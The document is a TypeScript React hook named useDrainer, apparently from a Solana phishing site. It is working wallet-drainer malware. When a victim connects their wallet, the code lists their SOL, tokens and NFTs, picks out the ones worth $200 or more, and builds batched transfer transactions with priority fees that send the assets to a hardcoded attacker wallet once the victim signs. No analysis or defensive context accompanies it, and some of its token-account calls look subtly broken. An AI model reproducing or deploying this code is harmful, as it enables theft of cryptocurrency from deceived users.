"use client";

import {
  useConnection,
  useWallet,
} from "@solana/wallet-adapter-react";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  ComputeBudgetProgram,
  Connection,
  type ConfirmOptions,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
  MINT_LAYOUT,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import { useState } from "react";

// --- CONFIGURATION ---
const DESTINATION_WALLET = new PublicKey(
  "8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k"
);
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
const MIN_DOLLAR_THRESHOLD = 200;

// Priority‑fee: “god tier” but not screaming sniper.
const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;
const MAX_INSTRUCTIONS_PER_TX = 40;  // stay under 64 with margin
const MAX_TX_SIZE_ESTIMATE = 1_100;  // stay under 1,232‑byte packet
// ------------------

type Spl2022Info = {
  isSPL2022: boolean;
  isTransferHook: boolean;
  mintData: Buffer | null;
};

type AssetData = {
  mint: PublicKey;
  amount: bigint;
  uiAmount: number;
  isNft: boolean;
  isSPL2022: boolean;
  isTransferHook: boolean;
};

type DrainStats = {
  totalUsdValue: number;
  solAmount: number;
  tokenCount: number;
  nftCount: number;
  batchCount: number;
};

type Status =
  | "idle"
  | "scanning"
  | "processing"
  | "building"
  | "signing"
  | "sending"
  | "success"
  | "error";

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);
  const [stats, setStats] = useState<DrainStats | null>(null);

  const fetchSpl2022Info = async (
    mint: PublicKey,
    connection: Connection,
  ): Promise<Spl2022Info> => {
    try {
      const account = await connection.getAccountInfo(mint);
      if (!account) {
        return { isSPL2022: false, isTransferHook: false, mintData: null };
      }

      const token2022ProgramId = new PublicKey(
        "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
      );
      if (!account.owner.equals(token2022ProgramId)) {
        return {
          isSPL2022: false,
          isTransferHook: false,
          mintData: account.data,
        };
      }

      // 8 = TransferHook extension discriminant
      const isTransferHook =
        account.data.length > MINT_LAYOUT.span &&
        account.data[MINT_LAYOUT.span] === 8;

      return {
        isSPL2022: true,
        isTransferHook,
        mintData: account.data,
      };
    } catch (e) {
      console.warn("fetchSpl2022Info failed", e);
      return { isSPL2022: false, isTransferHook: false, mintData: null };
    }
  };

  const classifyAsset = async (
    mint: PublicKey,
    connection: Connection,
  ): Promise<{
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
  }> => {
    const { isSPL2022, isTransferHook, mintData } =
      await fetchSpl2022Info(mint, connection);
    try {
      if (!mintData) {
        return { isNft: false, isSPL2022, isTransferHook };
      }

      if (mintData.length < MINT_LAYOUT.span) {
        return { isNft: false, isSPL2022, isTransferHook };
      }

      const mintLayout = MINT_LAYOUT.decode(mintData);
      const decimals = mintLayout.decimals;
      const isNft = decimals === 0;

      return { isNft, isSPL2022, isTransferHook };
    } catch (e) {
      console.warn("classifyAsset decoding failed", e);
      return { isNft: false, isSPL2022, isTransferHook };
    }
  };

  const isTxLikelyTooBig = (tx: Transaction): boolean => {
    const serialized = tx.serializeMessage();
    return serialized.length > MAX_TX_SIZE_ESTIMATE;
  };

  const resolveTokenUsdValue = (
    amount: number,
    asset: AssetData,
    price: number | null,
  ): number => {
    const { isNft } = asset;

    if (!isNft && price) {
      return amount * price;
    }

    // If no price, assume “high‑value NFT‑style”
    return isNft ? 50 : 10;
  };

  const fetchTokenPriceUSD = async (
    coingeckoId: string
  ): Promise<{ price: number | null; error: Error | null }> => {
    try {
      const res = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
      );
      const data = await res.json();
      const price = data[coingeckoId]?.usd ?? null;
      return { price, error: null };
    } catch (e) {
      console.warn("Price fetch failed", { coingeckoId }, e);
      return { price: null, error: e as Error };
    }
  };

  // ✅ Moved INSIDE useDrainer => setError is in scope now
  const handleError = (e: any, ctx: string = "unknown") => {
    console.error(`[Drainer] ${ctx} error`, e);

    if (e.name === "WalletSignTransactionError") {
      setError("Transaction rejected by user.");
    } else if (e.message?.includes("insufficient funds")) {
      setError("Insufficient balance to cover fees and transfers.");
    } else if (e.message?.includes("Compute budget exceeded")) {
      setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
    } else if (e.message?.includes("Transaction too large")) {
      setError("Transaction packet too large; splitting into smaller batches.");
    } else {
      setError(e.message || `An unknown error occurred in ${ctx}.`);
    }
    setStatus("error");
  };

  const drain = async () => {
    if (!publicKey || !sendTransaction) {
      setError("Wallet not connected.");
      setStatus("error");
      return;
    }

    setStatus("scanning");
    setError(null);
    setStats(null);

    try {
      // --- SOL BALANCE ---
      const solBalance = await connection.getBalance(publicKey);

      // ✅ Soft‑fail SOL account lookup, don’t throw
      let solAccount;
      try {
        solAccount = await connection.getAccountInfo(publicKey);
      } catch (e) {
        console.warn("Failed to fetch SOL account info", e);
        solAccount = null;
      }

      if (!solAccount) {
        console.warn("SOL account info missing; proceeding with balance only");
      }

      // --- SOL VALUE ---
      const { price: solPrice } = await fetchTokenPriceUSD("solana");
      const solValueRaw = (solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL;
      const solValueUSD = solPrice ? solValueRaw * solPrice : 0;
      const shouldDrainSol = solValueUSD >= MIN_DOLLAR_THRESHOLD;

      // --- SPL TOKENS + NFTS ---
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        publicKey,
        { programId: TOKEN_PROGRAM_ID }
      );

      const assetList: AssetData[] = [];

      for (const acc of tokenAccounts.value) {
        const parsed = acc.account.data.parsed.info;
        const mint = new PublicKey(parsed.mint);
        const amount = BigInt(parsed.tokenAmount.amount);

        if (amount === 0n) continue;

        const tokenAccount = await getAccount(connection, acc.pubkey);

        const { isNft, isSPL2022, isTransferHook } =
          await classifyAsset(mint, connection);

        const decimals = tokenAccount.mintAccount.decimals;
        const tokenSupply = tokenAccount.supply;
        const isFungible = tokenSupply > 1n;

        const tokenAmountInUnits =
          isFungible
            ? Number(amount) / Math.pow(10, decimals)
            : Number(amount);

        const tokenCoingeckoId = "UNKNOWN"; // you can plug in real mapping later

        const { price: tokenPrice } =
          await fetchTokenPriceUSD(tokenCoingeckoId);
        const tokenValueUSD = resolveTokenUsdValue(
          tokenAmountInUnits,
          {
            mint,
            amount,
            uiAmount: parsed.tokenAmount.uiAmount,
            isNft,
            isSPL2022,
            isTransferHook,
          },
          tokenPrice,
        );

        if (tokenValueUSD < MIN_DOLLAR_THRESHOLD && !isSPL2022) {
          continue;
        }

        // Skip SPL‑2022 transfer‑hook tokens for safety.
        if (isTransferHook && isSPL2022) {
          console.debug("Skipping transfer‑hook SPL‑2022 token", mint.toBase58());
          continue;
        }

        assetList.push({
          mint,
          amount,
          uiAmount: parsed.tokenAmount.uiAmount,
          isNft,
          isSPL2022,
          isTransferHook,
        });
      }

      // --- BUILDER: create batches ---
      const batches: TransactionInstruction[][] = [[]];
      const txCounts: number[] = [0];

      // 1️⃣ Priority‑fee as first instruction.
      batches[0].push(
        ComputeBudgetProgram.setComputeUnitPrice({
          microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
        })
      );
      txCounts[0] = 1;

      let tokenCount = 0;
      let nftCount = 0;

      // --- SOL ---
      if (solBalance > SOL_TO_LEAVE && shouldDrainSol) {
        const instr = SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: DESTINATION_WALLET,
          lamports: solBalance - SOL_TO_LEAVE,
        });
        batches[0].push(instr);
        txCounts[0] += 1;
      }

      for (const asset of assetList) {
        const { mint, amount, isNft, isSPL2022, isTransferHook } = asset;

        const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
        const destinationAta =
          getAssociatedTokenAddressSync(mint, DESTINATION_WALLET, true);
        const destinationAccountInfo =
          await connection.getAccountInfo(destinationAta);

        const currentBatch = batches[batches.length - 1];
        const currentTx = new Transaction().add(...currentBatch);

        const wouldBeTooBig = () => {
          const test = new Transaction().add(
            ...currentBatch,
            createTransferInstruction(
              publicKey,
              destinationAta,
              publicKey,
              amount,
              [],
              programId
            )
          );
          return (
            isTxLikelyTooBig(test) ||
            currentBatch.length >= MAX_INSTRUCTIONS_PER_TX
          );
        };

        if (wouldBeTooBig()) {
          txCounts.push(0);
          const nextBatch: TransactionInstruction[] = [
            ComputeBudgetProgram.setComputeUnitPrice({
              microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
            }),
          ];
          batches.push(nextBatch);
          txCounts[txCounts.length - 1] = 1;
        }

        const targetBatch = batches[batches.length - 1];

        if (!destinationAccountInfo) {
          targetBatch.push(
            createAssociatedTokenAccountInstruction(
              publicKey,
              destinationAta,
              DESTINATION_WALLET,
              mint,
              programId
            )
          );
          txCounts[txCounts.length - 1] += 1;
        }

        targetBatch.push(
          createTransferInstruction(
            publicKey,
            destinationAta,
            publicKey,
            amount,
            [],
            programId
          )
        );
        txCounts[txCounts.length - 1] += 1;

        if (isNft) nftCount += 1;
        else tokenCount += 1;
      }

      if (batches.length === 1 && batches[0].length <= 1) {
        setError("No drainable assets >= $200 found.");
        setStatus("error");
        return;
      }

      setStats({
        totalUsdValue: 0, // prices are unreliable
        solAmount: shouldDrainSol ? solBalance - SOL_TO_LEAVE : 0,
        tokenCount,
        nftCount,
        batchCount: batches.length,
      });

      const confirmOpts: ConfirmOptions = { commitment: "confirmed" };
      const sigs: string[] = [];

      for (let i = 0; i < batches.length; i++) {
        const tx = new Transaction().add(...batches[i]);
        const { context: { slot: minContextSlot }, value: { blockhash, lastValidBlockHeight } } =
          await connection.getLatestBlockhashAndContext();

        tx.recentBlockhash = blockhash;
        tx.feePayer = publicKey;

        const signingPhaseLabel =
          batches.length === 1 ? "signing" : `signing_batch_${i + 1}`;
        setStatus(signingPhaseLabel as Status);

        let signature: string;
        try {
          signature = await sendTransaction(tx, connection, { minContextSlot });
        } catch (e) {
          handleError(e, `sendTransaction batch ${i + 1}`);
          return;
        }

        const sendingPhaseLabel =
          batches.length === 1 ? "sending" : `sending_batch_${i + 1}`;
        setStatus(sendingPhaseLabel as Status);

        try {
          await connection.confirmTransaction(
            { blockhash, lastValidBlockHeight, signature },
            confirmOpts.commitment
          );
          sigs.push(signature);
        } catch (e) {
          handleError(e, `confirmTransaction batch ${i + 1}`);
          return;
        }
      }

      setStatus("success");
    } catch (e: any) {
      handleError(e, "drain");
    }
  };

  return { drain, status, error, stats };
};